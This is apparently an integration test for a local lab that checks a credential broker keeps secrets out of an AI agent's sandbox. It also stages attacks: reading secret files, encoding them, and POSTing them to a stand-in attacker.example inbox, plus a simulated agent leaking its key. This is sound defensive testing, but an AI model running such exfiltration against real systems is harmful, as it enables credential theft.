#!/usr/bin/env python3
"""Exercise the running disposable lab without printing its secret values."""
import base64
import io
import json
import subprocess
import tarfile
import time
import urllib.error
import urllib.parse
import urllib.request

PREFIX = 'agent-vault-playground-'
BASE = 'http://127.0.0.1:8787'

def docker(*args, data=None, check=True):
    p = subprocess.run(['docker', *args], input=data, capture_output=True, timeout=30)
    if check and p.returncode:
        raise RuntimeError('Docker verification command failed: ' + ' '.join(args[:3]))
    return p

def run(role, *args, data=None, check=True):
    return docker('exec', '-i', PREFIX + role + '-1', *args, data=data, check=check)

def api(path, data=None, origin=BASE):
    headers = {'Origin': origin}
    if data is not None:
        data = json.dumps(data).encode()
        headers['Content-Type'] = 'application/json'
    with urllib.request.urlopen(urllib.request.Request(BASE + path, data=data, headers=headers), timeout=10) as r:
        raw = r.read()
        return json.loads(raw) if raw else None

def check(ok, label):
    if not ok:
        raise AssertionError(label)
    print('PASS:', label, flush=True)

def request(path, *extra):
    return run('sandbox', 'request', '-H', 'Authorization: Bearer __vault_PAYMENTS_KEY__', *extra, path).stdout.decode()

def pg(query, check=True):
    return run('sandbox', 'env', 'PGPASSWORD=orders-placeholder', 'psql',
               'host=127.0.0.1 port=15432 dbname=orders user=workload sslmode=disable',
               '-At', '-v', 'ON_ERROR_STOP=1', '-c', query, check=check)

for _ in range(120):
    try:
        if api('/api/state').get('run',{}).get('id'):
            break
    except Exception:
        pass
    time.sleep(1)
else:
    raise RuntimeError('Lab did not become ready')

check(api('/api/state')['auditTotal'] == 0, 'startup checkpoints do not count as demo activity')
check('200 OK' in request('https://payments.example/refunds'), 'real payments request with placeholder')
check(b'duplicate scheduler' in pg('select * from refunds').stdout, 'real database query')
check(pg("update refunds set refunds=3", check=False).returncode != 0, 'database role rejects writes')
for _ in range(50):
    roles = run('database', 'psql', '-X', '-h', '/root', '-U', 'playground_admin', '-d', 'orders', '-Atc',
                "select count(*) from pg_roles where rolname like 'v-%'").stdout.strip()
    if roles == b'0':
        break
    time.sleep(.2)
check(roles == b'0', 'temporary database logins removed after disconnect')
logs = run('sandbox', 'request', '-H', 'Authorization: Bearer __vault_LOGS_TOKEN__', '-H', 'Content-Type: application/json', '-d',
           '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"search","arguments":{"query":"refund-worker"}}}', 'https://logs.example/mcp').stdout
check(b'200 OK' in logs and b'duplicate scheduler' in logs, 'real MCP tool request with brokered token')
request('https://attacker.example/inbox')
request('https://payments.example/echo')
request('https://payments.example/redirect', '-L')
request('https://payments.example/notes', '-d', '__vault_PAYMENTS_KEY__')
request('https://payments.example/refunds', '-X', 'DELETE')
run('sandbox', 'bash', '-c', '. /root/.env; request -H "Authorization: Bearer $BACKUP_KEY" https://payments.example/refunds')
time.sleep(.3)
state = api('/api/state')
outcomes = {r.get('outcome') for r in state['audit']}
check({'unlisted', 'secret_echo', 'placeholder_misplaced', 'decoy_credential'} <= outcomes, 'four distinct attack refusals in real audit rows')
check(not state['inbox'], 'protected attacks delivered nothing to attacker')
check(any(r.get('automation') == 'playground-run' for r in state['audit']), 'HTTP audit identifies the agent run')
check({'session_open', 'session_close'} <= {r['event'] for r in state['audit']}, 'database lifecycle is audited')
check(all('mac' in r and 'seq' in r for r in state['audit']), 'audit rows carry MACs and sequence numbers')

containers = json.loads(docker('inspect', *[PREFIX+r+'-1' for r in ['operator','broker','vault','relay','database','payments','logs','attacker','baseline','sandbox','web']]).stdout)
for c in containers:
    hc = c['HostConfig']
    check(not hc['Privileged'] and not hc.get('CapAdd') and hc['CapDrop'] == ['ALL'] and
          'no-new-privileges:true' in hc['SecurityOpt'] and
          all('docker.sock' not in m['Source'] for m in c['Mounts']), c['Name'].lstrip('/') + ' has no added container privilege')
check(run('sandbox','id','-u').stdout.strip() != b'0', 'sandbox user is unprivileged')
for c in containers:
    role = c['Config']['Cmd'][0]
    if role in ('relay','sandbox'):
        continue
    port = 8787 if role == 'web' else 5432 if role == 'database' else 8443 if role in ('broker','vault','operator') else 443
    for net in c['NetworkSettings']['Networks'].values():
        address = net['IPAddress'] + ':' + str(port)
        check(run('sandbox','playground','probe',address,check=False).returncode == 0, 'sandbox cannot directly reach '+role)
check(run('sandbox','playground','probe','example.com:443',check=False).returncode == 0, 'sandbox cannot reach public internet')
check(run('sandbox','playground','probe','host.docker.internal:443',check=False).returncode == 0, 'sandbox cannot reach host alias')
check(run('sandbox','timeout','4','getent','hosts','example.com',check=False).returncode != 0, 'sandbox DNS does not resolve outside names')
for origin in ['https://attacker.example', 'null']:
    try:
        api('/api/action', {'action':'run'}, origin)
        raise AssertionError('foreign origin was accepted')
    except urllib.error.HTTPError as e:
        check(e.code == 403, 'foreign Origin rejected')
r = urllib.request.Request(BASE, headers={'Host':'attacker.example'})
try:
    urllib.request.urlopen(r)
    raise AssertionError('foreign host accepted')
except urllib.error.HTTPError as e:
    check(e.code == 403, 'foreign Host rejected')

old_key = run('payments','cat','/state/key').stdout.strip()
api('/api/action',{'action':'rotate'})
time.sleep(.7)
request('https://payments.example/refunds')
check('200 OK' in request('https://payments.example/refunds'), 'rotation succeeds after cache rejection without restart')
old_request = b'GET /refunds HTTP/1.1\r\nHost: payments.example\r\nConnection: close\r\nAuthorization: Bearer '+old_key+b'\r\n\r\n'
old_result = run('payments','openssl','s_client','-connect','127.0.0.1:443','-servername','payments.example','-CAfile','/public/root.crt','-verify_return_error','-quiet',data=old_request,check=False)
check(b'401 Unauthorized' in old_result.stdout, 'payments service rejects the old key')

secrets = [run(role,'cat',path).stdout.strip() for role,path in [('payments','/state/key'),('logs','/state/key'),('relay','/state/token'),('relay','/state/proof'),('database','/state/password'),('vault','/state/root')]]
settings = json.loads(run('broker','cat','/state/env.json').stdout)
secrets += [settings['VAULT_TOKEN'].encode(),settings['AGENT_VAULT_MASTER_PASSWORD'].encode(),old_key]
for role in ['sandbox','web']:
    archive = run(role,'tar','-cf','-','/root','/public').stdout
    check(not any(v in archive for v in secrets), role+' filesystem contains none of the protected secrets')
    environment = run(role,'cat','/proc/1/environ').stdout
    check(not any(v in environment for v in secrets), role+' process environment contains none of the protected secrets')
for c in containers:
    raw = docker('logs',c['Id']).stdout + docker('logs',c['Id']).stderr
    check(not any(v in raw for v in secrets), c['Name'].lstrip('/')+' logs contain no protected secret')
check(not any(v.decode() in json.dumps(api('/api/state')) for v in secrets), 'public feed contains no protected secret')

api('/api/action',{'action':'run'})
time.sleep(.5)
check(any(r['source']=='unprotected agent' for r in api('/api/state')['inbox']), 'unprotected agent visibly leaks its separate key')
for value in secrets[:3]:
    for encoded in [value.decode(), base64.b64encode(value).decode(), value.hex(), ''.join('%%%02X'%b for b in value)]:
        check(bool(api('/api/claim',{'value':encoded})['matches']), 'claim checker recognizes a target encoding')
        payload=encoded.encode()
        wire=b'POST /inbox HTTP/1.1\r\nHost: attacker.example\r\nConnection: close\r\nContent-Length: '+str(len(payload)).encode()+b'\r\n\r\n'+payload
        run('baseline','openssl','s_client','-connect','attacker.example:443','-servername','attacker.example','-CAfile','/public/root.crt','-verify_return_error','-quiet',data=wire,check=False)
        check(bool(api('/api/state')['inbox'][-1]['matches']), 'attacker inbox recognizes the target encoding')
for value in ['__vault_PAYMENTS_KEY__',run('sandbox','cat','/public/decoy').stdout.decode().strip()]:
    check(not api('/api/claim',{'value':value})['matches'], 'placeholder or decoy does not win')
check('200 OK' in request('https://payments.example/scheduler/disable-duplicate', '-X', 'POST'), 'agent repairs scheduler through Gatehouse')
repaired = request('https://payments.example/scheduler/test-run', '-X', 'POST')
report = next(json.loads(line) for line in repaired.splitlines() if line.startswith('{'))
check(report['scheduler']['last_batch'] == {'orders':92,'refunds':92,'duplicates':0}, 'real demo test batch has no duplicate refunds')
check(report['historical_refunds'] == 184, 'repair preserves historical refund records')
example = api('/api/claim', {'value':'gatehouse-demo-claim-example'})
check(example['example'] and not example['matches'], 'public claim example does not count as a protected win')
previous = api('/api/state')['run']['id']
api('/api/action', {'action':'reset'})
for _ in range(40):
    fresh = api('/api/state')
    if fresh['run']['id'] != previous: break
    time.sleep(.1)
check(fresh['run']['id'] != previous and fresh['auditTotal'] == 0 and not fresh['inbox'], 'restart clears displayed activity and mailbox')
check(fresh['scenario']['duplicate'] and not fresh['scenario'].get('last_batch'), 'restart restores the incident')
print('PASS: local integration checks. Reset verified; the demo is ready for a new run.')
